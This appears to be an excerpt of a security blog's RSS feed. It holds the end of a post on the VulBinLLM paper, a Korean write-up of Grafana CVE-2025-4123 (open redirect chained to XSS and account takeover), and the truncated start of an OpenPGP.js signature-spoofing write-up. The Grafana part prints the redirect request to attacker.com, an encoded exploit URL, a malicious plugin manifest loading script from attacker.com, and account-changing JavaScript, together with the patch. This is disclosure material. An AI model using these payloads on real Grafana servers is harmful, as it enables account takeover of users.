Overflow</span>                <span class="hljs-comment">// The multiplication of two matrix elements can exceed the maximum value for an `int`,</span>                <span class="hljs-comment">// causing the value to wrap around (undefined behavior for signed integers).</span>                <span class="hljs-comment">// The subsequent accumulation into `result_matrix` could also overflow.</span>                                <span class="hljs-comment">// Vulnerability: Out-of-Bounds Read</span>                <span class="hljs-comment">// The loops iterate based on the external constants R1, R2, and C2. If these</span>                <span class="hljs-comment">// constants do not match the actual allocated sizes of the buffers pointed to</span>                <span class="hljs-comment">// by `matrix_A_ptr` and `matrix_B_ptr`, this operation will read from</span>                <span class="hljs-comment">// out-of-bounds memory, leading to information leakage or a crash.</span>                result_matrix[current_row][current_col] +=                    matrix_A[current_row][shared_dim] * matrix_B[shared_dim][current_col];            }        }    }    <span class="hljs-comment">// The function scope ends here. The `result_matrix` is destroyed upon returning.</span>    <span class="hljs-comment">// In a real-world scenario, its contents would likely have been copied to an</span>    <span class="hljs-comment">// output parameter pointer before the function returns.</span>}</code></pre><p>It gives more details than I thought, but anyway(?) the result looks good lol I think I can fix some details like too detailed description and using English.</p><h3 id="2-Long-term-Memory"><a href="#2-Long-term-Memory" class="headerlink" title="2) Long-term Memory"></a>2) Long-term Memory</h3><p>One of the inherent problems with LLM is the Context Window. You can&#x2019;t give us the whole programme in one go, so we have to ask you in chunks, but it&#x2019;s easy to lose context. It&#x2019;s hard to see the complex flow of how function A calls function B, and the result affects variable C.</p><p>VulBinLLM introduces the concept of &#x201C;long-term memory&#x201D; to solve this problem. The idea is to store a summary of important parts of the code (e.g. function summaries, data structures, etc.) in advance, and let LLM refer to this &#x2018;memory&#x2019; when analysing other code fragments. According to the paper, this information includes <strong>a summary of the program&#x2019;s purpose, key data structures, and function call graphs</strong>.</p><p>For example, when analysing the code above, the LLM would be presented with the following additional information</p><ul><li>Programme Summary:** &#x201C;This is a test program that accepts user input from environment variables and processes it.&#x201D;</li><li><strong>Data flow:</strong> &#x201C;The external input is stored in the <code>user_input&apos; variable via the</code>getenv&#x2019; function, which is used as a source for the `memcpy&#x2019; function.&#x201D;</li></ul><p>With this contextual information, LLM will clearly recognise that <code>user_input</code> is an &#x2018;untrusted external input&#x2019; and not just a string, and will be able to more accurately determine the vulnerability.</p><h2 id="Wrapping-up"><a href="#Wrapping-up" class="headerlink" title="Wrapping up"></a>Wrapping up</h2><p>Today, I&#x2019;ve been studying the paper &#x201C;VulBinLLM: LLM-powered Vulnerability Detection for Stripped Binaries&#x201D; and I&#x2019;ve made a quick summary of the paper, but there are a few things that I think are missing.</p><ol><li>It doesn&#x2019;t use the latest LLM model: This is a common shortcoming in many papers. I think it&#x2019;s because the development speed of the model is so fast that they design, develop, test, and then write the paper.</li><li>Is it really a novel idea&#x2026;? There are already papers on recovering stripped binary decompiled code. I&#x2019;m a bit dubious about the hacky research value of this thesis.</li></ol><p>Since there are so many LLM-related papers recently, it is not easy to pick out a really good paper and read it, so I often skim the idea. Still, if I see a paper with a good idea, I will study it again and post it lol.</p><p>Until next time&#x2026; I&#x2019;ll be back!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM/">LLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Security/">LLM Security</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Safety/">LLM Safety</category>
      
      <category domain="https://hackyboiz.github.io/tags/VulBinLLM/">VulBinLLM</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-4123 Grafana의 Open Redirect를 통한 XSS</title>
      <link>https://hackyboiz.github.io/2025/06/14/empty/CVE-2025-4123/</link>
      <guid>https://hackyboiz.github.io/2025/06/14/empty/CVE-2025-4123/</guid>
      <pubDate>Sat, 14 Jun 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nightbloodz.github.io/grafana-CVE-2025-4123</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nightbloodz.github.io/grafana-CVE-2025-4123/">https://nightbloodz.github.io/grafana-CVE-2025-4123/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Grafana 11.6.x &lt; 11.6.2</li><li>Grafana 11.5.x &lt; 11.5.5</li><li>Grafana 11.4.x &lt; 11.4.5</li><li>Grafana 11.3.x &lt; 11.3.7</li><li>Grafana 11.2.x &lt; 11.2.10</li><li>Grafana &lt; 10.4.19</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Grafana&#xC5D0;&#xB294; &#xC815;&#xC801; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD568;&#xC218; <strong><code>staticHandler</code></strong>&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC694;&#xCCAD;&#xC5D0; &#xB530;&#xB77C; &#xD2B9;&#xC815; &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC751;&#xB2F5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, <strong><code>opt.FileSystem.Open(file)</code></strong>&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC77C; &#xACBD;&#xC6B0; Content&#xB97C; &#xC751;&#xB2F5;&#xD558;&#xACE0; &#xD30C;&#xC77C;&#xC774; &#xC544;&#xB2CC; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC77C; &#xACBD;&#xC6B0; &#xC778;&#xB371;&#xC2A4; &#xD30C;&#xC77C;&#xC744; &#xC751;&#xB2F5;&#xD558;&#xAE30; &#xC704;&#xD574; Redirect&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC694;&#xCCAD; &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC801;&#xC808;&#xD788; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC544; <strong>Open Redirect &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xC774;&#xB97C; XSS&#xC640; &#xC5F0;&#xACC4;&#xD558;&#xBA74; Account Takeover</strong>&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">staticHandler</span><span class="hljs-params">(ctx *web.Context, log log.Logger, opt StaticOptions)</span> <span class="hljs-title">bool</span></span> {  <span class="hljs-comment">// URL&#xC758; path &#xD30C;&#xC2F1;</span>file := ctx.Req.URL.Path  ...  <span class="hljs-comment">// path &#xD30C;&#xC77C; &#xD578;&#xB4E4; &#xC624;&#xD508;</span>f, err := opt.FileSystem.Open(file) <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>}...<span class="hljs-comment">// &#xD30C;&#xC77C; &#xC815;&#xBCF4; &#xD655;&#xC778; (&#xB514;&#xB809;&#xD1A0;&#xB9AC;, &#xD30C;&#xC77C;, &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xB4F1;)</span>fi, err := f.Stat()<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>}  ...  <span class="hljs-comment">// &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC77C; &#xACBD;&#xC6B0;</span><span class="hljs-keyword">if</span> fi.IsDir() {<span class="hljs-keyword">if</span> !strings.HasSuffix(ctx.Req.URL.Path, <span class="hljs-string">&quot;/&quot;</span>) {path := fmt.Sprintf(<span class="hljs-string">&quot;%s/&quot;</span>, ctx.Req.URL.Path)<span class="hljs-keyword">if</span> !strings.HasPrefix(path, <span class="hljs-string">&quot;/&quot;</span>) {path = fmt.Sprintf(<span class="hljs-string">&quot;/%s&quot;</span>, path)} <span class="hljs-keyword">else</span> {rePrefix := regexp.MustCompile(<span class="hljs-string">`^(?:/\\|/+)`</span>)path = rePrefix.ReplaceAllString(path, <span class="hljs-string">&quot;/&quot;</span>)}<span class="hljs-comment">// Open Redirect &#xBC1C;&#xC0DD;</span>http.Redirect(ctx.Resp, ctx.Req, path, http.StatusFound)<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>}</code></pre><h3 id="Open-Redirect"><a href="#Open-Redirect" class="headerlink" title="Open Redirect"></a>Open Redirect</h3><p>Open Redirect&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB85C;&#xC9C1; <strong><code>http.Redirect()</code></strong>&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; <strong><code>opt.FileSystem.Open(file)</code></strong>&#xC5D0;&#xC11C; file &#xBCC0;&#xC218;&#xC5D0; &#xB2F4;&#xAE34; &#xACBD;&#xB85C;&#xAC00; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD574;&#xC57C; &#xD558;&#xBA70; <strong><code>fi.IsDir()</code></strong>&#xC870;&#xAC74;&#xBB38;&#xC5D0; &#xC9C4;&#xC785;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, <strong><code>http.Redirect()</code></strong>&#xC640; <strong><code>opt.FileSystem.Open(file)</code></strong>&#xB450; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xAC8C;&#xB054; &#xC694;&#xCCAD; &#xACBD;&#xB85C;&#xB97C; &#xC870;&#xC791;&#xD558;&#xC5EC;&#xC57C; &#xD558;&#xBA70; &#xC774;&#xB54C; &#xC911;&#xC694;&#xD55C; &#xAC74; <strong><code>?</code></strong>&#xB97C; URL &#xC778;&#xCF54;&#xB529;&#xD55C; <strong><code>%3f</code></strong> &#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">[&#xC694;&#xCCAD;]GET <span class="hljs-regexp">/public/</span>..<span class="hljs-regexp">/\attacker.com/</span>%<span class="hljs-number">3</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>.. HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">100.2</span>:<span class="hljs-number">3000</span>[&#xC751;&#xB2F5;]HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> FoundLocation: <span class="hljs-regexp">/\attacker.com/</span>?<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../</code></pre><ul><li>opt.FileSystem.Open(file)&#xB294; &#xC704; &#xACBD;&#xB85C;&#xB97C; &#xD574;&#xC11D;&#xD560; &#xB54C;, 4&#xBC88;&#xC758; ../&#xB97C; &#xC218;&#xD589;&#xD558;&#xC5EC; &#x201C;&#x201D;&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xB530;&#xB77C; &#xCF54;&#xB4DC; &#xC0C1;&#xC5D0;&#xC11C;&#xB294; /staticfiles/etc/etc/ &#xACBD;&#xB85C;&#xC758; &#xD30C;&#xC77C; &#xD578;&#xB4E4;&#xC744; &#xC624;&#xD508;&#xD569;&#xB2C8;&#xB2E4;.</li><li>fi.IsDir()&#xC5D0;&#xC11C;&#xB294; True&#xAC00; &#xBC18;&#xD658;&#xB418;&#xBA70; if&#xBB38;&#xC73C;&#xB85C; &#xC9C4;&#xC785;&#xD569;&#xB2C8;&#xB2E4;.</li><li>http.Redirect(path)&#xB294; Location&#xC744; &#xC704;&#xD55C; &#xBB38;&#xC790;&#xC5F4; &#xCC98;&#xB9AC;&#xB97C; &#xD560; &#xB54C;, <strong><code>%3f</code></strong>&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; Path&#xC640; Raw Query&#xB85C; &#xAD6C;&#xBD84;&#xD558;&#xC5EC; &#xBD84;&#xB9AC;&#xB97C; &#xD55C; &#xB4A4; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; <strong><code>/\attacker.com/%3f/../../../../</code></strong>&#xB97C; Location &#xD5E4;&#xB354;&#xC5D0; &#xB2F4;&#xC544; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2025/06/14/empty/CVE-2025-4123/1.png" alt="image.png"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Grafana&#xB294; &#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC;&#xC5D0;&#xC11C; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xC571; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xACBD;&#xB85C; <strong><code>/a/{plugin-app-name}/explore</code></strong>&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xC0C1;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xB85C; &#xC694;&#xCCAD;&#xC744; &#xD560; &#xACBD;&#xC6B0; Grafana&#xC758; &#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC;&#xC758; JS&#xB294; <strong><code>{plugin-app-name}</code></strong>&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; <strong><code>/api/plugins/{pugin-app-name}/settings</code></strong>&#xB85C; <strong><code>fetch</code></strong>&#xD569;&#xB2C8;&#xB2E4;<strong>.</strong></p><p>&#xADF8; &#xB4A4;, &#x201C;module&#x201D; &#xD544;&#xB4DC;&#xC5D0; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xB294; JS&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">{    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;plugin-app&quot;</span>,    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;app&quot;</span>,    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-string">&quot;plugin-app&quot;</span>,    <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;pinned&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;autoEnabled&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;module&quot;</span>: <span class="hljs-string">&quot;/modules/..../plugin-app.js&quot;</span>, <span class="hljs-comment">//js file to load</span>    <span class="hljs-attr">&quot;baseUrl&quot;</span>: <span class="hljs-string">&quot;public/plugins/grafana-lokiexplore-app&quot;</span>,    <span class="hljs-attr">&quot;info&quot;</span>: {        <span class="hljs-attr">&quot;author&quot;</span>: {            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Grafana&quot;</span>            ...        }    }    ...</code></pre><p>&#xB530;&#xB77C;&#xC11C;, Open Redirect&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB97C; URL &#xC778;&#xCF54;&#xB529;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xD55C; &#xB4A4;, &#xC545;&#xC131; module&#xC744; &#xC751;&#xB2F5;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>/a/<strong><code>..%2f..%2f..%2fpublic%2f..%252f%255Cattacker.com%252f%253Fp%252f..%252f..%23</code></strong>/explore</li></ul><pre><code class="hljs json">{    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;ExploitPluginReq&quot;</span>,    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;app&quot;</span>,    <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-string">&quot;grafana-lokiexplore-app&quot;</span>,    <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;pinned&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;autoEnabled&quot;</span>: <span class="hljs-literal">true</span>,    <span class="hljs-attr">&quot;module&quot;</span>: <span class="hljs-string">&quot;http://attacker.com/file?js=file&quot;</span>,    <span class="hljs-attr">&quot;baseUrl&quot;</span>: <span class="hljs-string">&quot;public/plugins/grafana-lokiexplore-app&quot;</span>,    <span class="hljs-attr">&quot;info&quot;</span>: {        &quot;author&quot;: {...}    }    ...}</code></pre><blockquote><p><a href="https://github.com/NightBloodz/CVE-2025-4123/blob/main/js.js">https://github.com/NightBloodz/CVE-2025-4123/blob/main/js.js</a></p></blockquote><p>module&#xC5D0;&#xC11C; <strong><code>http://attacker.com/file?js=file</code></strong> &#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74;, &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xB294; js&#xB97C; &#xC751;&#xB2F5;&#xD558;&#xBA70; Account Takeover&#xAC00; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">fetch(&quot;/api/user&quot;, {  method: &quot;PUT&quot;,  headers: {    &quot;x-grafana-device-id&quot;: &quot;3b3353978aa55a04cd5b130d126adfee&quot;,    &quot;User-Agent&quot;:      &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;,    Accept: &quot;application/json, text/plain, */*&quot;,    &quot;Content-Type&quot;: &quot;application/json&quot;,    &quot;x-grafana-org-id&quot;: &quot;1&quot;,    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;,    <span class="hljs-comment">// Note: &apos;Cookie&apos; headers are restricted by browsers in JavaScript fetch</span>  },  body: JSON.stringify({    name: &quot;pwned&quot;,    email: &quot;pwned@pwned.com&quot;,    login: &quot;pwned&quot;,  }),  credentials: &quot;include&quot;, // if you want cookies like grafana_session to be sent})  .then((response) =&gt; response.json())  .then((data) =&gt; console.log(data))  .catch((error) =&gt; console.error(&quot;Error:&quot;, error));alert(&quot;account pwned&quot;);</code></pre><blockquote><p><a href="https://github.com/NightBloodz/CVE-2025-4123/blob/main/js.js">https://github.com/NightBloodz/CVE-2025-4123/blob/main/js.js</a></p></blockquote><p><img src="/2025/06/14/empty/CVE-2025-4123/2.png" alt="image.png"></p><h2 id="&#xCDE8;&#xC57D;&#xC810;-&#xD328;&#xCE58;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xD328;&#xCE58;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;"></a>&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;</h2><p>Redirect&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC804; <strong><code>path.Clean</code></strong> &#xC744; &#xD1B5;&#xD574; <strong><code>../</code>,</strong> <code>./</code>, <strong><code>&#xC911;&#xBCF5; /</code></strong> &#xB97C; &#xC81C;&#xAC70;&#xD558;&#xC5EC; opt.FileSystem.Open&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC815;&#xADDC;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC5EC; &#xBD88;&#xC77C;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD328;&#xCE58; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs go">@@ <span class="hljs-number">-159</span>,<span class="hljs-number">16</span> +<span class="hljs-number">159</span>,<span class="hljs-number">17</span> @@ <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">staticHandler</span><span class="hljs-params">(ctx *web.Context, log log.Logger, opt StaticOptions)</span> <span class="hljs-title">bool</span></span> {        <span class="hljs-keyword">if</span> fi.IsDir() {                <span class="hljs-comment">// Redirect if missing trailing slash.</span>                <span class="hljs-keyword">if</span> !strings.HasSuffix(ctx.Req.URL.Path, <span class="hljs-string">&quot;/&quot;</span>) {-                       path := fmt.Sprintf(<span class="hljs-string">&quot;%s/&quot;</span>, ctx.Req.URL.Path)-                       <span class="hljs-keyword">if</span> !strings.HasPrefix(path, <span class="hljs-string">&quot;/&quot;</span>) {+                       redirectPath := path.Clean(ctx.Req.URL.Path)+                       redirectPath = fmt.Sprintf(<span class="hljs-string">&quot;%s/&quot;</span>, redirectPath)+                       <span class="hljs-keyword">if</span> !strings.HasPrefix(redirectPath, <span class="hljs-string">&quot;/&quot;</span>) {                                <span class="hljs-comment">// Disambiguate that it&apos;s a path relative to this server</span>-                               path = fmt.Sprintf(<span class="hljs-string">&quot;/%s&quot;</span>, path)+                               redirectPath = fmt.Sprintf(<span class="hljs-string">&quot;/%s&quot;</span>, redirectPath)                        } <span class="hljs-keyword">else</span> {                                <span class="hljs-comment">// A string starting with // or /\ is interpreted by browsers as a URL, and not a server relative path</span>                                rePrefix := regexp.MustCompile(<span class="hljs-string">`^(?:/\\|/+)`</span>)-                               path = rePrefix.ReplaceAllString(path, <span class="hljs-string">&quot;/&quot;</span>)+                               redirectPath = rePrefix.ReplaceAllString(redirectPath, <span class="hljs-string">&quot;/&quot;</span>)                        }-                       http.Redirect(ctx.Resp, ctx.Req, path, http.StatusFound)+                       http.Redirect(ctx.Resp, ctx.Req, redirectPath, http.StatusFound)                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>                }</code></pre><blockquote><p><a href="https://github.com/grafana/grafana/commit/c7a690348df761d41b659224cbc50a46a0c0e4cc">https://github.com/grafana/grafana/commit/c7a690348df761d41b659224cbc50a46a0c0e4cc</a></p></blockquote>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Grafana/">Grafana</category>
      
      <category domain="https://hackyboiz.github.io/tags/Open-Redirect/">Open Redirect</category>
      
      <category domain="https://hackyboiz.github.io/tags/XSS/">XSS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Account-Takeover/">Account Takeover</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/14/empty/CVE-2025-4123/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-47934: OpenPGP.js 서명 스푸핑 취약점</title>
      <link>https://hackyboiz.github.io/2025/06/12/OUYA77/2025-06-12/</link>
      <guid>https://hackyboiz.github.io/2025/06/12/OUYA77/2025-06-12/</guid>
      <pubDate>Thu, 12 Jun 2025 08:20:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://codeanlabs.com/blog/research/cve-2025-47934</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://codeanlabs.com/blog/research/cve-2025-47934-spoofing-openpgp-js-signatures/">https://codeanlabs.com/blog/research/cve-2025-47934-spoofing-openpgp-js-signatures/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenPGP.js  &lt; v5.11.3</li><li>OpenPGP.js  &lt; v6.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>OpenPGP.js&#xB294; OpenPGP &#xD45C;&#xC900;(RFC 9580)&#xC744; &#xAD6C;&#xD604;&#xD55C; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB85C;, &#xC554;&#xD638;&#xD654;&#xB41C; &#xC774;&#xBA54;&#xC77C;&#xC774;&#xB098; &#xC11C;&#xBA85;&#xB41C; Git &#xCEE4;&#xBC0B; &#xB4F1;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD45C;&#xC900;&#xC740; &#xBA54;&#xC2DC;&#xC9C0; &#xC554;&#xD638;&#xD654;, &#xC11C;&#xBA85;, &#xD0A4; &#xAD00;&#xB9AC; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. OpenPGP &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xD328;&#xD0B7;&#xC758; &#xC2DC;&#xD000;&#xC2A4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xBA70;, &#xAC01; &#xD328;&#xD0B7;&#xC740; &#xD45C;&#xC900;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xB530;&#xB985;&#xB2C8;&#xB2E4;. OpenPGP.js&#xB294; Mailvelope &#xBC0F; Proton Mail&#xACFC; &#xAC19;&#xC740; &#xC5EC;&#xB7EC; &#xC6F9; &#xAE30;&#xBC18; &#xC774;&#xBA54;&#xC77C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>PGP &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC5EC;&#xB7EC; &#xD328;&#xD0B7;&#xC758; &#xC2DC;&#xD000;&#xC2A4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xBA70;, &#xAC01; &#xD328;&#xD0B7;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;, &#xC11C;&#xBA85;, &#xC555;&#xCD95; &#xB370;&#xC774;&#xD130; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAD6C;&#xC870;&#xC801; &#xC720;&#xC5F0;&#xC131; &#xB54C;&#xBB38;&#xC5D0; &#xBA54;&#xC2DC;&#xC9C0; &#xB0B4;&#xBD80;&#xC5D0; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xD328;&#xD0B7;&#xC774; &#xCD94;&#xAC00;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause-amp-PoC"><a href="#root-cause-amp-PoC" class="headerlink" title="root cause &amp; PoC"></a><strong>root cause &amp; PoC</strong></h3><p>OpenPGP.js&#xC758; &#xD328;&#xD0B7; &#xCC98;&#xB9AC; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC124;&#xACC4; &#xACB0;&#xD568;&#xC73C;&#xB85C; &#xC778;&#xD574;, &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#x201C;&#xC2E4;&#xC81C;&#xB85C; &#xC11C;&#xBA85;&#xB41C; &#xB370;&#xC774;&#xD130;&#x201D;&#xC640; &#x201C;&#xCD5C;&#xC885; &#xBC18;&#xD658;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#x201D; &#xAC04;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xB0B4;&#xBD80;&#xC758; <strong>&#xBE44;&#xB3D9;&#xAE30; &#xC2A4;&#xD2B8;&#xB9BC; &#xD30C;&#xC2F1; &#xAD6C;&#xC870;&#xC640; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC758; &#xBBF8;&#xD761;&#xD55C; &#xBD84;&#xB9AC; &#xCC98;&#xB9AC;</strong>&#xC5D0; &#xAE30;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> openpgp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;openpgp&apos;</span>);(<span class="hljs-keyword">async</span> () =&gt; {    <span class="hljs-comment">// Generated using:</span>    <span 